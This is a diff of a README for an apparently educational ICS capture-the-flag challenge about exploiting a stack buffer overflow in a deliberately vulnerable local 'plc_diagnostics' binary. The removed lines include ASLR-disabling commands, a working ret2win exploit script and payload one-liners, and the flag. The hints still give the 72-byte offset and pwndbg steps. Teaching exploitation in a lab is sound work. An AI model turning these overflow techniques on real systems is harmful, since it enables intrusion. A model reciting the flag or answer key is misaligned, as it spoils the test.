@@ -1,8 +1,8 @@
-# 💥 Stack Smashing the PLC Diagnostics Service
+# Stack Smashing the PLC Diagnostics Service
 
 > **MITRE ATT&CK for ICS:** `Execution` | [T0807 - Command-Line Interface](https://attack.mitre.org/techniques/T0807/) | [T0862 - Supply Chain Compromise](https://attack.mitre.org/techniques/T0862/)
 
-## 📋 Overview
+## Overview
 
 A forgotten **internal maintenance binary** (`plc_diagnostics`) has been discovered on the attack machine. It was written years ago by a field engineer and never audited for security. The binary contains a classic **stack-based buffer overflow** — user input is copied into a fixed-size stack buffer without any length check, allowing an attacker to overwrite the return address and redirect execution.
 
@@ -17,13 +17,13 @@ Stack frame of run_diagnostic():
 Goal: replace the return address with the address of maintenance_shell()
 ```
 
-## 📦 Prerequisites
+## Prerequisites
 
 - Access to the attack machine (`http://localhost:6081/vnc.html`) or the webshell
 - The challenge files are located at `/opt/challenges/buffer_overflow/` on the attack machine
-- Tools required: `gcc`, `gdb`, `pwndbg`, `python3`, `nm`, `checksec`
+- Tools required: `gcc`, `pwndbg`, `python3`, `nm`, `checksec`
 
-## 🎯 Task
+## Task
 
 Analyse the binary, find the vulnerability, determine the exact overflow offset, and redirect execution to the hidden `maintenance_shell()` function to capture the flag.
 
@@ -33,31 +33,23 @@ The flag has the format `CybICS(flag)`.
 
 ### Phase 1: Setup & Reconnaissance
 
-1. Copy the challenge files to your working directory and compile the binary:
+- Copy the challenge files to your working directory and compile the binary:
 
-   ```bash
-   cp -r /opt/challenges/buffer_overflow ~/Desktop/bof_challenge
-   cd ~/Desktop/bof_challenge
-   make
-   ```
+```bash
+cp -r /opt/challenges/buffer_overflow ~/Desktop/bof_challenge
+cd ~/Desktop/bof_challenge
+make
+```
 
-2. Disable ASLR so memory addresses stay stable between runs:
+- Run the binary normally to understand its behaviour:
 
-   ```bash
-   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-   ```
+```bash
+./plc_diagnostics
+```
 
-   ⚠️ **Important:** This command affects the entire system kernel. **Always run this inside VM machine** — never on your host system. If you are working directly on a host machine, re-enable ASLR afterwards with `echo 2 | sudo tee /proc/sys/kernel/randomize_va_space`.
+   Enter an input when prompted and observe the output.
 
-3. Run the binary normally to understand its behaviour:
-
-   ```bash
-   ./plc_diagnostics
-   ```
-
-   Enter `STATUS` when prompted and observe the output.
-
-4. Check what security protections are active:
+- Check what security protections are active:
 
    ```bash
    checksec --file=./plc_diagnostics
@@ -65,7 +57,25 @@ The flag has the format `CybICS(flag)`.
 
    You should see: **No canary**, **No PIE**, **NX disabled** — ideal conditions for a stack overflow.
 
-5. List all function symbols and their addresses:
+
+   <details>
+   <summary>Binary Compiler Flags</summary>
+
+   <ul style="padding-left: 40px;">
+    <li><code>-fno-stack-protector</code> → disables stack canaries</li>
+    <li><code>-no-pie</code> → disables PIE, resulting in fixed addresses</li>
+    <li><code>-z execstack</code> → marks the stack as executable</li>
+    <li>
+   <a href="https://caiorss.github.io/C-Cpp-Notes/compiler-flags-options.html">
+      Learn more about C compiler flags
+   </a>
+    </li>
+  </ul>
+
+   </details>
+
+
+- List all function symbols and their addresses:
 
    ```bash
    nm ./plc_diagnostics | grep -E "maintenance|run_diag|main"
@@ -73,96 +83,127 @@ The flag has the format `CybICS(flag)`.
 
    **Write down the address of `maintenance_shell`** — this is your target jump address.
 
-6. Read the source code and find the vulnerability:
+- Read the source code and find the vulnerability:
 
    ```bash
    cat plc_diagnostics.c
    ```
 
+   What makes this binary exploitable?
+
+   <details>
+   <summary>Hint</summary>
+
+   <ul style="padding-left: 40px;">
+      <li>C has some unsafe functions. Look for one.</li> 
+      <li><a href="https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/dangers-c.html">
+      Learn more about unsafe functions
+   </a></li>
+  </ul>
+
+   </details>
+
+   <details>
+   <summary>Solution</summary>
+
+   <div style="padding: 10px;">
    Look for the unsafe `strcpy()` call inside `run_diagnostic()`. Unlike `strncpy()`, `strcpy()` copies until it hits a null byte with no regard for the destination buffer size.
+   </div>
+
+   </details>
+
 
 ### Phase 2: Find the Overflow Offset
 
 You need to know exactly how many bytes of padding are required before you reach the return address on the stack.
 
-1. Open the binary in GDB:
+- Open the binary in pwndbg:
 
    ```bash
-   gdb ./plc_diagnostics
+   pwndbg ./plc_diagnostics
    ```
 
-2. Generate a De Bruijn cyclic pattern with pwndbg — every 8-byte subsequence in this pattern is unique, which lets you pinpoint the exact offset after a crash:
+- Generate a cyclic pattern with pwndbg. Every 8-byte subsequence in this pattern is unique, which lets you pinpoint the exact offset after a crash:
 
    ```
-   pwndbg> cyclic 120
+   pwndbg> cyclic <charLength>
    ```
 
-3. Run the program and paste the full 120-character pattern when prompted:
+   Try different input lengths.
+
+   <details>
+   <summary>Hint</summary>
+
+   <div style="padding: 10px;">
+   Try it with a length of 100
+   </div>
+
+   </details>
+
+
+
+- Run the program and paste the full character pattern when prompted:
 
    ```
    pwndbg> run
    ```
 
-   The program will crash with a **Segmentation Fault**.
+   If the cyclic pattern is long enough, the program will crash with a **Segmentation Fault**.
 
-4. Read the value of `RIP` after the crash and find its position in the pattern:
+- If a **Segmentation Fault** is triggered, find the unique cyclic pattern value that was written as the return address on the stack.
 
+   <details>
+   <summary>Hint</summary>
+
+   <div style="padding: 10px;">
+   Try to find a command in pwndbg that allows you to read the stack value that the stack pointer (RSP) points to.
+   </div>
+
+   </details>
+
+   <details>
+   <summary>Solution</summary>
+
+   <div style="padding: 10px;">
+   Use the following command to extract the pattern that was written to the return address on the stack:
+   </div>
+
+   ```bash
+   x/1gx $rsp
    ```
-   pwndbg> cyclic -l $rip
-   ```
 
+   </details>
+
+- If the cyclic pattern is found, try to get the offset for the return address which cyclic
+
+   <details>
+   <summary>Solution</summary>
+
+   <div style="padding: 10px;">
+   Use following command to extract the offset of the return address with the previous found return address pattern.
+   </div>
+
+   ```bash
+      cyclic -l <unique_pattern>
+   ```
+   
+   <div style="padding: 10px;">
    The result is your offset — it should be **72** (64 bytes for `cmd_buffer` + 8 bytes for saved RBP on x86-64).
+   </div>
+
+   </details>
+
 
 ### Phase 3: Craft and Send the Exploit
 
-1. Verify the offset manually inside GDB before writing the full exploit. Replace `0x????????????` with the real address from Phase 1:
+Use the standalone exploit script `exploit.py` to obtain the flag:
 
-   ```
-   pwndbg> run <<< $(python3 -c "
-   import struct, sys
-   payload = b'A' * 72 + struct.pack('<Q', 0x????????????)
-   sys.stdout.buffer.write(payload)
-   ")
-   ```
-
-   If the offset is correct, `maintenance_shell()` runs and you see the flag.
-
-2. Write a standalone exploit script `exploit.py`:
-
-   ```python
-   #!/usr/bin/env python3
-   import struct
-   import subprocess
-
-   BINARY           = "./plc_diagnostics"
-   MAINTENANCE_ADDR = 0x????????????  # paste address from: nm ./plc_diagnostics | grep maintenance_shell
-   OFFSET           = 72              # 64 (cmd_buffer) + 8 (saved RBP)
-
-   payload = b"A" * OFFSET + struct.pack("<Q", MAINTENANCE_ADDR)
-
-   print(f"[*] Sending {len(payload)}-byte payload to {BINARY}")
-   subprocess.run([BINARY], input=payload)
-   ```
-
-3. Update `MAINTENANCE_ADDR` with the real address, then run:
+   Update `<MAINTENANCE_ADDR>` with the real address and `<OFFSET>` with the offset, then run:
 
    ```bash
    python3 exploit.py
    ```
 
-### Phase 4: Capture the Flag
-
-A successful exploit redirects execution into `maintenance_shell()` which prints:
-
-```
-  *** MAINTENANCE MODE ACTIVATED ***
-  PLC Diagnostic System - Internal Access
-  ----------------------------------------
-  Congratulations, you have gained control
-  of the PLC diagnostics process!
-
-  FLAG: CybICS(buff3r_0v3rfl0w_pwn3d)
-```
 
 Submit the flag in the CTF dashboard.
 
@@ -198,29 +239,3 @@ Submit the flag in the CTF dashboard.
 **Why NIST 800-82r3 matters here:** NIST 800-82r3 Section 6.2 highlights that legacy ICS software often lacks modern security controls such as stack canaries, ASLR, and safe string-handling functions. SI-2 (Flaw Remediation) requires organisations to identify and patch vulnerable binaries. RA-5 (Vulnerability Scanning) recommends static analysis tools such as `flawfinder` or `cppcheck` to detect unsafe function calls like `strcpy()` before deployment.
 
 </details>
-
-## 🔍 Defensive Thinking
-
-After completing this challenge, consider:
-- The binary was compiled with `-fno-stack-protector`. How does a **stack canary** prevent this exact attack, and why would it only slow down an attacker rather than stop them completely?
-- **No PIE** means `maintenance_shell()` has a fixed address. If PIE were enabled, how would you still find the address? (Hint: look up *format string leaks* and *ret2libc*)
-- What would a **static analysis** tool like `flawfinder` or `cppcheck` report when run against `plc_diagnostics.c`?
-- In a real ICS environment, how would you detect that a field binary has been tampered with or was never audited? Consider file integrity monitoring and software bill of materials (SBOM).
-
-## 💡 Hints
-
-Use `nm ./plc_diagnostics | grep maintenance_shell` to find the target address. The offset is the size of `cmd_buffer` (64 bytes) plus the size of the saved frame pointer (8 bytes on x86-64) — so 72 bytes total. Use `struct.pack("<Q", addr)` in Python to encode the address in little-endian 64-bit format.
-
-## 🔍 Solution
-
-Find the address of `maintenance_shell` with `nm`, then send 72 bytes of padding followed by that address packed as a little-endian 64-bit integer:
-
-```bash
-python3 -c "
-import struct, subprocess
-addr = 0x????????????  # from: nm ./plc_diagnostics | grep maintenance_shell
-subprocess.run(['./plc_diagnostics'], input=b'A'*72 + struct.pack('<Q', addr))
-"
-```
-
-**Flag:** `CybICS(buff3r_0v3rfl0w_pwn3d)`
